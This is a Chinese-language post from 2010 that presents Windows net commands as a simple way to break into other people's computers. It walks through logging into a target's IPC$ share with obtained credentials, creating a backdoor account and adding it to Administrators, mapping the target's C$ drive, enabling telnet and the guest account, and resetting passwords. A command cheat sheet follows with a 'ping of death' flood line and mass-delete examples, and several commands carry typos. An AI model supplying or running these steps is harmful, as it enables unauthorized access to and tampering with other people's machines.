dos命令之net，教你怎么攻击别人电脑。特简单2010-12-16 17:10通过扫描21端口或3389端口就可以入侵

一般黑客入侵所需要的几个常用命令

1：NET 

只要你拥有某IP的用户名和密码，那就用IPC$做连接吧！ 

这里我们假如你得到的用户是hbx，密码是123456。假设对方IP为127.0.0.1 

net use \\127.0.0.1\ipc$ "123456" /user:"hbx" 

退出的命令是 

net use \\127.0.0.1\ipc$ /delte 

下面的操作你必须登陆后才可以用.登陆的方法就在上面. 

---------------------- 

下面我们讲怎么创建一个用户，由于SA的权限相当于系统的超级用户. 

我们加一个heibai的用户密码为lovechina 

net user heibai lovechina /add 

只要显示命令成功,那么我们可以把他加入Administrator组了. 

net localgroup Administrators heibai /add 

---------------------- 

这里是讲映射对方的C盘,当然其他盘也可以,只要存在就行了.我们这里把对方的C盘映射到本地的Z盘. 

net use z:\\127.0.0.1\c$ 

---------------------- 

net start telnet 

这样可以打开对方的TELNET服务. 

---------------------- 

这里是将Guest用户激活，guest是NT的默认用户，而且无法删除呢？不知道是否这样，我的2000就是删除不了它。 

net user guest /active:yes 

---------------------- 

这里是把一个用户的密码改掉，我们把guest的密码改为lovechina，其他用户也可以的。只要有权限就行了呀！ 

net user guest lovechina 

net命令果然强大啊！ 
――――――――――――――――――――――――――――――――――
net use ipipc$ " " /user:" " 建立IPC空链接

　　net use ipipc$ "密码" /user:"用户名" 建立IPC非空链接

　　net use h: ipc$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H:

　　net use h: ipc$ 登陆后映射对方C：到本地为H:

　　net use ipipc$ /del 删除IPC链接

　　net use h: /del 删除映射对方到本地的为H:的映射

　　net user 用户名　密码　/add 建立用户

　　net user guest /active:yes 激活guest用户

　　net user 查看有哪些用户

　　net user 帐户名 查看帐户的属性

　　net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数

　　net start 查看开启了哪些服务

　　net start 服务名　 开启服务；(如:net start telnet， net start schedule)

　　net stop 服务名 停止某服务

　　net time 目标ip 查看对方时间

　　net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息

　　net view 查看本地局域网内开启了哪些共享

　　net view ip 查看对方局域网内开启了哪些共享

　　net config 显示系统网络设置

　　net logoff 断开连接的共享

　　net pause 服务名 暂停某服务

　　net send ip "文本信息" 向对方发信息

　　net ver 局域网内正在使用的网络连接类型和信息

　　net share 查看本地开启的共享

　　net share ipc$ 开启ipc$共享

　　net share ipc$ /del 删除ipc$共享

　　net share c$ /del 删除C：共享

　　net user guest 12345 用guest用户登陆后用将密码改为12345

　　net password 密码 更改系统登陆密码

　　netstat -a 查看开启了哪些端口,常用netstat -an

　　netstat -n 查看端口的网络连接情况，常用netstat -an

　　netstat -v 查看正在进行的工作

　　netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）

　　netstat -s 查看正在使用的所有协议使用情况

　　nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写

　　tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。

　　ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。

　　ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)

　　ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息

　　tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)

　　kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)

　　del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件

 
